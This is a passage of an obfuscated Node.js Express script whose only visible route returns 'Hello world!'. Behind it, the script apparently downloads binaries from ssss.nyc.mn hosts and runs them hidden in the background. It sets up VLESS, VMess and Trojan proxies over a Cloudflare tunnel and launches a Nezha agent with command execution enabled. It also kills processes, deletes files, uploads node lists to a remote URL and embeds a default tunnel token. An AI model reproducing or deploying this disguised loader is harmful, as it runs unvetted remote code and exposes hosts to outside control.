const _0x473d5e=_0x21e2;(function(_0x577abc,_0x455063){const _0xbf4ec2={_0x3cb3c1:0x13c,_0x3626ad:0x116,_0x496c3a:0x152,_0x2ed12b:0x12a,_0xc98e1a:0xb5},_0x8c90f=_0x21e2,_0x4a6e19=_0x577abc();while(!![]){try{const _0x47e8d3=parseInt(_0x8c90f(_0xbf4ec2._0x3cb3c1))/0x1+-parseInt(_0x8c90f(_0xbf4ec2._0x3626ad))/0x2*(parseInt(_0x8c90f(0xad))/0x3)+-parseInt(_0x8c90f(0xb9))/0x4+parseInt(_0x8c90f(_0xbf4ec2._0x496c3a))/0x5+-parseInt(_0x8c90f(0x154))/0x6*(-parseInt(_0x8c90f(_0xbf4ec2._0x2ed12b))/0x7)+-parseInt(_0x8c90f(_0xbf4ec2._0xc98e1a))/0x8*(parseInt(_0x8c90f(0xb6))/0x9)+-parseInt(_0x8c90f(0xe1))/0xa*(-parseInt(_0x8c90f(0x127))/0xb);if(_0x47e8d3===_0x455063)break;else _0x4a6e19['push'](_0x4a6e19['shift']());}catch(_0x2d1c9e){_0x4a6e19['push'](_0x4a6e19['shift']());}}}(_0x221a,0x8dfd6));const express=require(_0x473d5e(0x141)),app=express(),axios=require(_0x473d5e(0x11a)),os=require('os'),fs=require('fs'),path=require(_0x473d5e(0x10f)),{promisify}=require(_0x473d5e(0xab)),exec=promisify(require(_0x473d5e(0x126))[_0x473d5e(0xaf)]),{execSync}=require(_0x473d5e(0x126)),UPLOAD_URL=process[_0x473d5e(0xa1)][_0x473d5e(0xa8)]||'',PROJECT_URL=process[_0x473d5e(0xa1)][_0x473d5e(0xf1)]||'',AUTO_ACCESS=process[_0x473d5e(0xa1)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x473d5e(0xa1)][_0x473d5e(0x13a)]||_0x473d5e(0xa2),SUB_PATH=process[_0x473d5e(0xa1)][_0x473d5e(0x110)]||'sub',PORT=process['env'][_0x473d5e(0x11e)]||process[_0x473d5e(0xa1)]['PORT']||0xbb8,UUID=process[_0x473d5e(0xa1)][_0x473d5e(0xc4)]||'2fee7c45-9eee-4cf4-add2-0685f9ae97c8',NEZHA_SERVER=process[_0x473d5e(0xa1)][_0x473d5e(0xde)]||'',NEZHA_PORT=process[_0x473d5e(0xa1)][_0x473d5e(0xd4)]||'',NEZHA_KEY=process[_0x473d5e(0xa1)][_0x473d5e(0x12f)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x473d5e(0x138),ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiNmY2NWQ5NjhjMzBhZGZhODRjYmU5ZmFkZTViODE1NzIiLCJ0IjoiMjYyMDY2OTAtYjczNS00NWYzLWFkNzItMzc0N2I4YjVkNGI3IiwicyI6Ik5qUmlZamN6TXpJdFlUWTROaTAwTmpNd0xUbGlPR1l0WmpRM01UQmtZVFE1T1dVeCJ9',ARGO_PORT=process[_0x473d5e(0xa1)][_0x473d5e(0x105)]||0x1f41,CFIP=process[_0x473d5e(0xa1)][_0x473d5e(0xf8)]||_0x473d5e(0xfe),CFPORT=process[_0x473d5e(0xa1)][_0x473d5e(0x157)]||0x1bb,NAME=process[_0x473d5e(0xa1)]['NAME']||_0x473d5e(0xdf);!fs[_0x473d5e(0x12c)](FILE_PATH)?(fs[_0x473d5e(0x101)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x473d5e(0x162)](FILE_PATH+_0x473d5e(0xc8));function generateRandomName(){const _0x2f90c8={_0x233092:0xc0},_0x3375f9=_0x473d5e,_0x58e462=_0x3375f9(0x148);let _0x56ba63='';for(let _0x138dbb=0x0;_0x138dbb<0x6;_0x138dbb++){_0x56ba63+=_0x58e462['charAt'](Math[_0x3375f9(0xb7)](Math[_0x3375f9(_0x2f90c8._0x233092)]()*_0x58e462[_0x3375f9(0x146)]));}return _0x56ba63;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x473d5e(0x147)](FILE_PATH,npmName),phpPath=path[_0x473d5e(0x147)](FILE_PATH,phpName),webPath=path[_0x473d5e(0x147)](FILE_PATH,webName),botPath=path[_0x473d5e(0x147)](FILE_PATH,botName),subPath=path[_0x473d5e(0x147)](FILE_PATH,'sub.txt'),listPath=path[_0x473d5e(0x147)](FILE_PATH,_0x473d5e(0x134)),bootLogPath=path[_0x473d5e(0x147)](FILE_PATH,_0x473d5e(0x136)),configPath=path[_0x473d5e(0x147)](FILE_PATH,_0x473d5e(0x119));function deleteNodes(){const _0x54352a={_0x179e0e:0x12c,_0x4d5b83:0x13d,_0x3d1fb1:0xff,_0x3b4ead:0x13b,_0x3706e5:0x146,_0x2ce5c7:0xfb,_0xa2c2a6:0x9e},_0x5e9d24=_0x473d5e;try{if(!UPLOAD_URL)return;if(!fs[_0x5e9d24(_0x54352a._0x179e0e)](subPath))return;let _0x17bbf1;try{_0x17bbf1=fs[_0x5e9d24(_0x54352a._0x4d5b83)](subPath,_0x5e9d24(0xa4));}catch{return null;}const _0x78f123=Buffer[_0x5e9d24(0xfc)](_0x17bbf1,_0x5e9d24(_0x54352a._0x3d1fb1))[_0x5e9d24(0x159)]('utf-8'),_0x53fd6d=_0x78f123[_0x5e9d24(0xfa)]('\x0a')[_0x5e9d24(_0x54352a._0x3b4ead)](_0x2ba08b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2ba08b));if(_0x53fd6d[_0x5e9d24(_0x54352a._0x3706e5)]===0x0)return;return axios[_0x5e9d24(_0x54352a._0x2ce5c7)](UPLOAD_URL+_0x5e9d24(0xa9),JSON[_0x5e9d24(_0x54352a._0xa2c2a6)]({'nodes':_0x53fd6d}),{'headers':{'Content-Type':_0x5e9d24(0x137)}})[_0x5e9d24(0x10e)](_0x1ff16b=>{return null;}),null;}catch(_0x53b1d7){return null;}}function cleanupOldFiles(){const _0x3ccc99={_0x10e5a4:0xe0},_0x486b62={_0x2d76cd:0xc2},_0x4c9481=_0x473d5e;try{const _0x38ddff=fs[_0x4c9481(_0x3ccc99._0x10e5a4)](FILE_PATH);_0x38ddff['forEach'](_0x300052=>{const _0x9960d1=_0x4c9481,_0x5f5014=path['join'](FILE_PATH,_0x300052);try{const _0xc3af4a=fs['statSync'](_0x5f5014);_0xc3af4a[_0x9960d1(0xa0)]()&&fs[_0x9960d1(_0x486b62._0x2d76cd)](_0x5f5014);}catch(_0x33ecb1){}});}catch(_0x1feaef){}}function _0x221a(){const _0x3f56c0=['push','tunnel.yml','none','/vmess-argo','php\x20running\x20error:\x20','has','NEZHA_PORT','?security=tls&sni=','tunnel.json','match','https://amd64.ssss.nyc.mn/bot','block','https://arm64.ssss.nyc.mn/bot','success','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0avless://','NEZHA_SERVER','Railway','readdirSync','26930ANVNKT','get','App\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','test','arm64','npm\x20running\x20error:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','text/plain;\x20charset=utf-8','automatic\x20access\x20task\x20added\x20successfully','Empowerment\x20success\x20for\x20','pkill\x20-f\x20\x22[','127.0.0.1','true','https://ipapi.co/json/','/sub.txt\x20saved\x20successfully','PROJECT_URL','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','writeFileSync','\x22\x20>\x20/dev/null\x202>&1','Content-Type','/dev/null','then','CFIP','https://amd64.ssss.nyc.mn/agent','split','post','from','\x0a\x20\x20\x20\x20','cdns.doon.eu.org','base64','https://amd64.ssss.nyc.mn/web','mkdirSync','/vmess-argo?ed=2560','response','basename','ARGO_PORT','Error\x20executing\x20command:\x20','https://arm64.ssss.nyc.mn/web','.exe\x20>\x20nul\x202>&1','trojan','http://ip-api.com/json/','xtls-rprx-vision','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','/tunnel.yml\x20run','catch','path','SUB_PATH','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https+local://8.8.8.8/dns-query','config.yaml','https://amd64.ssss.nyc.mn/v1','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','115446gvxGHN','Empowerment\x20failed\x20for\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','config.json','axios','TunnelSecret','all','listen','SERVER_PORT','send','win32','nohup\x20','Download\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20-c\x20\x22','child_process','3311ocSJnx','quic','https://arm64.ssss.nyc.mn/agent','136787bGMqZh','includes','existsSync','2096','web\x20running\x20error:\x20','NEZHA_KEY','\x20-s\x20','country_code','Error\x20reading\x20boot.log:','vless','list.txt','org','boot.log','application/json','galaxy.itwogo.dpdns.org','del\x20/f\x20/q\x20','FILE_PATH','filter','1163147KCAaOO','readFileSync','rm\x20-rf\x20','pop','message','express','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Unhandled\x20error\x20in\x20startserver:','2053','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','length','join','abcdefghijklmnopqrstuvwxyz','NEZHA\x20variable\x20is\x20empty,skip\x20running','Hello\x20world!','2083','arch','\x20>/dev/null\x202>&1\x20&','fileName','set','/api/add-subscriptions','Subscription\x20uploaded\x20successfully','1057885QxNxzd','8443','270mSqqEK','finish','\x20successfully','CFPORT','taskkill\x20/f\x20/im\x20','toString','--tls','status','platform','aarch64','error','firefox','http','\x20failed:\x20','log','arm','stringify','\x0a\x20\x20tunnel:\x20','isFile','env','./tmp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','utf-8','data','forEach','Error\x20in\x20startserver:','UPLOAD_URL','/api/delete-nodes','close','util','2087','45wdlNVW','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','exec','\x0a\x0avmess://','tcp','charAt','unlink','amd','476696cSFSql','117GrnnbH','floor','\x20>\x20nul\x202>&1','3370384AdKkza','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','clear','vmess','443','&fp=firefox&type=ws&host=','ArgoDomain:','random','Error\x20downloading\x20files:','unlinkSync','/vless-argo','UUID','Skipping\x20adding\x20automatic\x20access\x20task','\x20is\x20running','\x20-c\x20','\x20already\x20exists','/api/add-nodes','tls','freedom','/config.json\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'];_0x221a=function(){return _0x3f56c0;};return _0x221a();}app[_0x473d5e(0xe2)]('/',function(_0x359396,_0x479d8a){const _0x5746ca={_0x52e345:0x14a},_0x448943=_0x473d5e;_0x479d8a['send'](_0x448943(_0x5746ca._0x52e345));});async function generateConfig(){const _0x5e0c10={_0x1fbeda:0xf6,_0x592120:0xd0,_0x184663:0x10b,_0x5a33b5:0xc3,_0x1b4109:0xd1,_0x21aeb3:0xc3,_0x4a1ed3:0x160,_0x109b9b:0xed,_0x2ac68d:0xd1,_0x4d6517:0x128,_0x6b0359:0x109,_0x424122:0x160,_0x3215f4:0xca,_0x33305a:0x112,_0x1c5aab:0xcb,_0x1a2161:0xd9},_0x28f896=_0x473d5e,_0xb1d074={'log':{'access':_0x28f896(_0x5e0c10._0x1fbeda),'error':_0x28f896(0xf6),'loglevel':_0x28f896(_0x5e0c10._0x592120)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x28f896(0x133),'settings':{'clients':[{'id':UUID,'flow':_0x28f896(_0x5e0c10._0x184663)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x28f896(_0x5e0c10._0x5a33b5),'dest':0xbba},{'path':_0x28f896(_0x5e0c10._0x1b4109),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x28f896(0xb1)}},{'port':0xbb9,'listen':_0x28f896(0xed),'protocol':_0x28f896(0x133),'settings':{'clients':[{'id':UUID}],'decryption':_0x28f896(_0x5e0c10._0x592120)},'streamSettings':{'network':_0x28f896(0xb1),'security':_0x28f896(0xd0)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x28f896(0x133),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x28f896(0xd0)},'streamSettings':{'network':'ws','security':_0x28f896(0xd0),'wsSettings':{'path':_0x28f896(_0x5e0c10._0x21aeb3)}},'sniffing':{'enabled':!![],'destOverride':[_0x28f896(_0x5e0c10._0x4a1ed3),_0x28f896(0xca),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x28f896(_0x5e0c10._0x109b9b),'protocol':_0x28f896(0xbc),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x28f896(_0x5e0c10._0x2ac68d)}},'sniffing':{'enabled':!![],'destOverride':[_0x28f896(_0x5e0c10._0x4a1ed3),'tls',_0x28f896(_0x5e0c10._0x4d6517)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x28f896(_0x5e0c10._0x6b0359),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x28f896(_0x5e0c10._0x592120),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x28f896(_0x5e0c10._0x424122),_0x28f896(_0x5e0c10._0x3215f4),_0x28f896(0x128)],'metadataOnly':![]}}],'dns':{'servers':[_0x28f896(_0x5e0c10._0x33305a)]},'outbounds':[{'protocol':_0x28f896(_0x5e0c10._0x1c5aab),'tag':'direct'},{'protocol':'blackhole','tag':_0x28f896(_0x5e0c10._0x1a2161)}]};fs['writeFileSync'](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0xb1d074,null,0x2));}function getSystemArchitecture(){const _0x2e46d2={_0x518a37:0x15d,_0x3bb852:0x163,_0x62c4ad:0xb4},_0x346fee=_0x473d5e,_0x577c4e=os[_0x346fee(0x14c)]();return _0x577c4e===_0x346fee(0x163)||_0x577c4e===_0x346fee(0xe6)||_0x577c4e===_0x346fee(_0x2e46d2._0x518a37)?_0x346fee(_0x2e46d2._0x3bb852):_0x346fee(_0x2e46d2._0x62c4ad);}function downloadFile(_0x1ac419,_0x34faef,_0x2bf3fe){const _0x14728c={_0x8d25bd:0x12c,_0x16ef67:0x101,_0x2dbb49:0xf7,_0x3f11fa:0x10e},_0x532b43={_0x1ab7b4:0x104,_0x35a811:0x140,_0x379fe4:0x15e},_0x30bd28={_0x2a72c3:0x155},_0x3b865c=_0x473d5e,_0x1f26df=_0x1ac419;!fs[_0x3b865c(_0x14728c._0x8d25bd)](FILE_PATH)&&fs[_0x3b865c(_0x14728c._0x16ef67)](FILE_PATH,{'recursive':!![]});const _0x20e33a=fs['createWriteStream'](_0x1f26df);axios({'method':_0x3b865c(0xe2),'url':_0x34faef,'responseType':'stream'})[_0x3b865c(_0x14728c._0x2dbb49)](_0x52c51c=>{const _0x12da38={_0x27bdb1:0x122,_0x2662a3:0x140},_0xa559b1={_0x369b6c:0x162,_0x541263:0x122,_0x1f1276:0x156},_0x5e5c18=_0x3b865c;_0x52c51c['data']['pipe'](_0x20e33a),_0x20e33a['on'](_0x5e5c18(_0x30bd28._0x2a72c3),()=>{const _0x4d896e=_0x5e5c18;_0x20e33a[_0x4d896e(0xaa)](),console[_0x4d896e(_0xa559b1._0x369b6c)](_0x4d896e(_0xa559b1._0x541263)+path[_0x4d896e(0x104)](_0x1f26df)+_0x4d896e(_0xa559b1._0x1f1276)),_0x2bf3fe(null,_0x1f26df);}),_0x20e33a['on'](_0x5e5c18(0x15e),_0x2dab64=>{const _0x1847be=_0x5e5c18;fs[_0x1847be(0xb3)](_0x1f26df,()=>{});const _0x381993=_0x1847be(_0x12da38._0x27bdb1)+path[_0x1847be(0x104)](_0x1f26df)+_0x1847be(0x161)+_0x2dab64[_0x1847be(_0x12da38._0x2662a3)];console[_0x1847be(0x15e)](_0x381993),_0x2bf3fe(_0x381993);});})[_0x3b865c(_0x14728c._0x3f11fa)](_0x2b3f4e=>{const _0xb4912f=_0x3b865c,_0x3769ca=_0xb4912f(0x122)+path[_0xb4912f(_0x532b43._0x1ab7b4)](_0x1f26df)+_0xb4912f(0x161)+_0x2b3f4e[_0xb4912f(_0x532b43._0x35a811)];console[_0xb4912f(_0x532b43._0x379fe4)](_0x3769ca),_0x2bf3fe(_0x3769ca);});}async function downloadFilesAndRun(){const _0x1eaad3={_0x3bf96f:0x15e,_0x549f86:0xfa,_0x23c3ef:0x12d,_0x57456a:0xd3,_0x404c3d:0x124,_0x5ddd62:0xba,_0x2ae0cb:0xf3,_0x2b998e:0x113,_0x1963dc:0x121,_0x3ff617:0x125,_0x483f6b:0xc6,_0x1fb0b0:0x15e,_0x414e7b:0xd2,_0x430edd:0x153,_0x4b0033:0x12d,_0xfd2ebe:0x144,_0x216324:0x12b,_0x4ce7ab:0x15a,_0x3a079a:0x130,_0x245fba:0x162,_0x2f39e5:0x121,_0x25d691:0x12e,_0xe9856b:0xe4,_0x25fd2c:0x10d,_0xdecd8c:0x145},_0x2ea0bf=_0x473d5e,_0x497be8=getSystemArchitecture(),_0x175851=getFilesForArchitecture(_0x497be8);if(_0x175851[_0x2ea0bf(0x146)]===0x0){console['log'](_0x2ea0bf(0x10c));return;}const _0x6aeea0=_0x175851['map'](_0x525abe=>{const _0x184ec9={_0x2f9b65:0x14e};return new Promise((_0x875f82,_0x253c25)=>{const _0x552418=_0x21e2;downloadFile(_0x525abe[_0x552418(_0x184ec9._0x2f9b65)],_0x525abe['fileUrl'],(_0x27324d,_0x16aeab)=>{_0x27324d?_0x253c25(_0x27324d):_0x875f82(_0x16aeab);});});});try{await Promise[_0x2ea0bf(0x11c)](_0x6aeea0);}catch(_0x1c50ec){console[_0x2ea0bf(_0x1eaad3._0x3bf96f)](_0x2ea0bf(0xc1),_0x1c50ec);return;}function _0x12fc40(_0xf4f0ef){const _0x3b78f5={_0x9431ab:0xeb,_0x45c1d8:0x159},_0x294967=_0x2ea0bf,_0x412ddb=0x1fd;_0xf4f0ef[_0x294967(0xa6)](_0x54d138=>{fs['existsSync'](_0x54d138)&&fs['chmod'](_0x54d138,_0x412ddb,_0x1dd923=>{const _0x5425ce=_0x21e2;_0x1dd923?console[_0x5425ce(0x15e)](_0x5425ce(0x117)+_0x54d138+':\x20'+_0x1dd923):console['log'](_0x5425ce(_0x3b78f5._0x9431ab)+_0x54d138+':\x20'+_0x412ddb[_0x5425ce(_0x3b78f5._0x45c1d8)](0x8));});});}const _0x599074=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x12fc40(_0x599074);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x495d27=NEZHA_SERVER[_0x2ea0bf(0x12b)](':')?NEZHA_SERVER[_0x2ea0bf(_0x1eaad3._0x549f86)](':')[_0x2ea0bf(0x13f)]():'',_0x2dacfe=new Set([_0x2ea0bf(0xbd),'8443',_0x2ea0bf(_0x1eaad3._0x23c3ef),_0x2ea0bf(0xac),'2083',_0x2ea0bf(0x144)]),_0x250321=_0x2dacfe[_0x2ea0bf(_0x1eaad3._0x57456a)](_0x495d27)?_0x2ea0bf(0xee):'false',_0x2b2547='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2ea0bf(0x118)+NEZHA_SERVER+_0x2ea0bf(_0x1eaad3._0x404c3d)+_0x250321+_0x2ea0bf(_0x1eaad3._0x5ddd62)+UUID;fs[_0x2ea0bf(_0x1eaad3._0x2ae0cb)](path['join'](FILE_PATH,_0x2ea0bf(_0x1eaad3._0x2b998e)),_0x2b2547);const _0x24a1ee=_0x2ea0bf(_0x1eaad3._0x1963dc)+phpPath+_0x2ea0bf(_0x1eaad3._0x3ff617)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x24a1ee),console['log'](phpName+_0x2ea0bf(_0x1eaad3._0x483f6b)),await new Promise(_0x8c0b6f=>setTimeout(_0x8c0b6f,0x3e8));}catch(_0x181294){console[_0x2ea0bf(_0x1eaad3._0x1fb0b0)](_0x2ea0bf(_0x1eaad3._0x414e7b)+_0x181294);}}else{let _0xccf1ff='';const _0x591788=['443',_0x2ea0bf(_0x1eaad3._0x430edd),_0x2ea0bf(_0x1eaad3._0x4b0033),'2087',_0x2ea0bf(0x14b),_0x2ea0bf(_0x1eaad3._0xfd2ebe)];_0x591788[_0x2ea0bf(_0x1eaad3._0x216324)](NEZHA_PORT)&&(_0xccf1ff=_0x2ea0bf(_0x1eaad3._0x4ce7ab));const _0x10adaa=_0x2ea0bf(0x121)+npmPath+_0x2ea0bf(_0x1eaad3._0x3a079a)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xccf1ff+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x10adaa),console['log'](npmName+_0x2ea0bf(0xc6)),await new Promise(_0x1da853=>setTimeout(_0x1da853,0x3e8));}catch(_0x50e9fb){console[_0x2ea0bf(0x15e)](_0x2ea0bf(0xe7)+_0x50e9fb);}}}else console[_0x2ea0bf(_0x1eaad3._0x245fba)](_0x2ea0bf(0x149));const _0x1c8e86=_0x2ea0bf(_0x1eaad3._0x2f39e5)+webPath+_0x2ea0bf(0xc7)+FILE_PATH+_0x2ea0bf(0xcc);try{await exec(_0x1c8e86),console['log'](webName+_0x2ea0bf(0xc6)),await new Promise(_0x25208c=>setTimeout(_0x25208c,0x3e8));}catch(_0x280469){console[_0x2ea0bf(_0x1eaad3._0x3bf96f)](_0x2ea0bf(_0x1eaad3._0x25d691)+_0x280469);}if(fs['existsSync'](botPath)){let _0x53a693;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x53a693='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x2ea0bf(0xd7)](/TunnelSecret/)?_0x53a693=_0x2ea0bf(_0x1eaad3._0xe9856b)+FILE_PATH+_0x2ea0bf(_0x1eaad3._0x25fd2c):_0x53a693=_0x2ea0bf(_0x1eaad3._0xdecd8c)+FILE_PATH+_0x2ea0bf(0xf2)+ARGO_PORT;try{await exec(_0x2ea0bf(0x121)+botPath+'\x20'+_0x53a693+_0x2ea0bf(0x14d)),console['log'](botName+_0x2ea0bf(0xc6)),await new Promise(_0x5712c2=>setTimeout(_0x5712c2,0x7d0));}catch(_0x29554a){console[_0x2ea0bf(0x15e)](_0x2ea0bf(0x106)+_0x29554a);}}await new Promise(_0x22472e=>setTimeout(_0x22472e,0x1388));}function getFilesForArchitecture(_0x5d0064){const _0xa9af61={_0x409915:0x107,_0x18a103:0x100,_0x4ae37a:0xd8},_0x4acaac=_0x473d5e;let _0x4ffbcf;_0x5d0064===_0x4acaac(0x163)?_0x4ffbcf=[{'fileName':webPath,'fileUrl':_0x4acaac(_0xa9af61._0x409915)},{'fileName':botPath,'fileUrl':_0x4acaac(0xda)}]:_0x4ffbcf=[{'fileName':webPath,'fileUrl':_0x4acaac(_0xa9af61._0x18a103)},{'fileName':botPath,'fileUrl':_0x4acaac(_0xa9af61._0x4ae37a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3adb3a=_0x5d0064===_0x4acaac(0x163)?_0x4acaac(0x129):_0x4acaac(0xf9);_0x4ffbcf['unshift']({'fileName':npmPath,'fileUrl':_0x3adb3a});}else{const _0xc925e4=_0x5d0064==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x4acaac(0x114);_0x4ffbcf['unshift']({'fileName':phpPath,'fileUrl':_0xc925e4});}}return _0x4ffbcf;}function argoType(){const _0x22d78a={_0x2adbf6:0xae,_0x536887:0x147,_0x57bcd6:0x147,_0x2eeb81:0xdc,_0x2f6856:0xf3,_0x595f81:0x147},_0x112b63=_0x473d5e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x112b63(0x162)](_0x112b63(_0x22d78a._0x2adbf6));return;}if(ARGO_AUTH[_0x112b63(0x12b)](_0x112b63(0x11b))){fs[_0x112b63(0xf3)](path[_0x112b63(_0x22d78a._0x536887)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x2b0d4f=_0x112b63(0x9f)+ARGO_AUTH[_0x112b63(0xfa)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x112b63(_0x22d78a._0x57bcd6)](FILE_PATH,_0x112b63(0xd6))+_0x112b63(0xcd)+ARGO_DOMAIN+_0x112b63(_0x22d78a._0x2eeb81)+ARGO_PORT+_0x112b63(0x111);fs[_0x112b63(_0x22d78a._0x2f6856)](path[_0x112b63(_0x22d78a._0x595f81)](FILE_PATH,_0x112b63(0xcf)),_0x2b0d4f);}else console[_0x112b63(0x162)](_0x112b63(0x115));}async function extractDomains(){const _0x2f1c1d={_0x4465dc:0x13d,_0x3699e8:0xfa,_0x3ac8ff:0xa6,_0x1f630e:0x162,_0x2e9b34:0xbf,_0x3fd1a7:0x142,_0x18c49f:0xc2,_0x417522:0x14d,_0xbfa3c7:0x106},_0x1eeb7c={_0x584dab:0xef,_0x2b5feb:0xa5,_0x24a72d:0x135,_0x21e245:0xa5,_0x53841c:0xa5},_0x783285={_0x5b43b3:0x15c,_0x476d24:0x120,_0x59f025:0x158,_0x21fa2d:0xec,_0x361ce3:0xb2,_0x19b9d5:0xf4},_0x1334fd=_0x473d5e;let _0x121a78;if(ARGO_AUTH&&ARGO_DOMAIN)_0x121a78=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x121a78),await _0x227d89(_0x121a78);else try{const _0xf5f7a0=fs[_0x1334fd(_0x2f1c1d._0x4465dc)](path['join'](FILE_PATH,_0x1334fd(0x136)),'utf-8'),_0x1adc71=_0xf5f7a0[_0x1334fd(_0x2f1c1d._0x3699e8)]('\x0a'),_0x27ed03=[];_0x1adc71[_0x1334fd(_0x2f1c1d._0x3ac8ff)](_0x2ca159=>{const _0x50cb41=_0x1334fd,_0x5712ae=_0x2ca159[_0x50cb41(0xd7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5712ae){const _0xf610a8=_0x5712ae[0x1];_0x27ed03[_0x50cb41(0xce)](_0xf610a8);}});if(_0x27ed03['length']>0x0)_0x121a78=_0x27ed03[0x0],console[_0x1334fd(_0x2f1c1d._0x1f630e)](_0x1334fd(_0x2f1c1d._0x2e9b34),_0x121a78),await _0x227d89(_0x121a78);else{console[_0x1334fd(0x162)](_0x1334fd(_0x2f1c1d._0x3fd1a7)),fs[_0x1334fd(_0x2f1c1d._0x18c49f)](path[_0x1334fd(0x147)](FILE_PATH,_0x1334fd(0x136)));async function _0x646e39(){const _0x59d3db=_0x1334fd;try{process[_0x59d3db(_0x783285._0x5b43b3)]===_0x59d3db(_0x783285._0x476d24)?await exec(_0x59d3db(_0x783285._0x59f025)+botName+_0x59d3db(0x108)):await exec(_0x59d3db(_0x783285._0x21fa2d)+botName[_0x59d3db(_0x783285._0x361ce3)](0x0)+']'+botName['substring'](0x1)+_0x59d3db(_0x783285._0x19b9d5));}catch(_0x340858){}}_0x646e39(),await new Promise(_0x32c446=>setTimeout(_0x32c446,0xbb8));const _0x490d8d='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1334fd(0xf2)+ARGO_PORT;try{await exec(_0x1334fd(0x121)+botPath+'\x20'+_0x490d8d+_0x1334fd(_0x2f1c1d._0x417522)),console['log'](botName+_0x1334fd(0xc6)),await new Promise(_0x2e7f1f=>setTimeout(_0x2e7f1f,0xbb8)),await extractDomains();}catch(_0x400d65){console[_0x1334fd(0x15e)](_0x1334fd(_0x2f1c1d._0xbfa3c7)+_0x400d65);}}}catch(_0x1a11a6){console['error'](_0x1334fd(0x132),_0x1a11a6);}async function _0x3af52d(){const _0x4831fd=_0x1334fd;try{const _0x5d70d7=await axios['get'](_0x4831fd(_0x1eeb7c._0x584dab),{'timeout':0xbb8});if(_0x5d70d7['data']&&_0x5d70d7['data'][_0x4831fd(0x131)]&&_0x5d70d7[_0x4831fd(_0x1eeb7c._0x2b5feb)][_0x4831fd(0x135)])return _0x5d70d7[_0x4831fd(0xa5)]['country_code']+'_'+_0x5d70d7[_0x4831fd(0xa5)][_0x4831fd(_0x1eeb7c._0x24a72d)];}catch(_0x221d40){try{const _0x42976c=await axios[_0x4831fd(0xe2)](_0x4831fd(0x10a),{'timeout':0xbb8});if(_0x42976c[_0x4831fd(_0x1eeb7c._0x21e245)]&&_0x42976c[_0x4831fd(0xa5)][_0x4831fd(0x15b)]===_0x4831fd(0xdb)&&_0x42976c[_0x4831fd(0xa5)]['countryCode']&&_0x42976c['data'][_0x4831fd(0x135)])return 